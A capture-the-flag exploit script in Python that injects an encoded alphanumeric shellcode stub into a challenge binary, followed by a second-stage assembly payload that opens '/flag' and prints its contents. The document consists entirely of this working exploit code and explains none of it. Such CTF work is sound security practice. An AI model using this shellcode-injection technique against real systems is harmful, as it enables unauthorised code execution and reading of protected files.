#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("./libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

ru(b"Give me your shellcode: ")
sc = asm("push 0x686b4878; pop rax; xor rax,0x48484848;")
sc += b"WTYH39YjoTYfi9pYWZjoTYfi9o00t800T8U0T8VjUTYfi9ml0t800T8KHc1jhTYfi1OLLJt04jATYfi1WjVYIJ4NVTXAkv21B2t11A0v1IoVL90uzGFNwEpiAKnSP5qe5KtMmpAXioOr4J8WtiKDkNA476VU0YNS9bBWscce2OMcvrvPA0ExHH"
s(sc)

debugB()
sc = asm(
    """
    mov   rax, 3
    mov   rdi, 0
    syscall

    mov rsi, 0x20230000
    mov r12, 444016125487
    mov qword ptr [rsi], r12

    mov rdi, rsi
    mov rsi, 0
    mov rax, 2
    syscall

    mov rsi, 0x20230000
loop:
    mov rdi, 0
    mov rdx, 1
    xor rax, rax
    syscall
    inc rsi
    test rax, rax
    jne loop

    mov rsi, 0x20230000
loop2:
    mov rdi, 1
    mov rdx, 1
    mov rax, 1
    syscall
    inc rsi
    cmp rsi, 0x20230080
    jb loop2

"""
)
sc = sc.ljust(0x800, b"\x90")
s(sc)

ia()
